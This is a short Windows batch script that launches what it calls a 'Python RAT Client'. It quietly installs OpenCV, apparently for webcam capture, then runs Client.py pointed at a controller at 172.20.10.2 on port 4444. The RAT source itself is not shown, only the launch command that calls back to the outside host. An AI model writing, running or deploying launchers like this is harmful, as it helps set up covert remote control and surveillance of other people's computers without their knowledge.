@echo off
echo Installing OpenCV if needed...
venv\Scripts\activate
pip install opencv-python --quiet

echo Starting Python RAT Client...
cd Client
python Client.py --host 172.20.10.2 --port 4444

pause 